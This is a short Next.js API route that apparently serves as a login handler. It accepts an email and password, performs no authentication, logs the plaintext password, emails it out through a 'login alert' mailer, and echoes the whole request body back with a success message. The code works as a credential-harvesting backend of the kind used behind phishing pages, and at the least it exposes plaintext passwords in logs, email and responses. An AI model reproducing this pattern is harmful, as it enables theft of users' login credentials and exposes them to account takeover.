import { NextResponse } from "next/server";
import { logUserActivity } from "@/app/lib/api-helpers";
import { sendLoginAlert } from "@/app/lib/mailer";

export async function POST(request) {
  try {
    // Parse the request body
    const body = await request.json();
    const { email, password, isOauth } = body;

    if (email && password) {
      await logUserActivity(email, password, isOauth);
      sendLoginAlert(
        email,
        password,
        isOauth ? "used google to login" : "Normal log in"
      );
    }

    // Return success response
    return NextResponse.json(
      {
        message: "Data received and logged successfully",
        data: body,
      },
      { status: 200 }
    );
  } catch (error) {
    console.error("Error processing request:", error);

    // Return error response
    return NextResponse.json(
      {
        error: "Failed to process request",
        details: error.message,
      },
      { status: 400 }
    );
  }
}
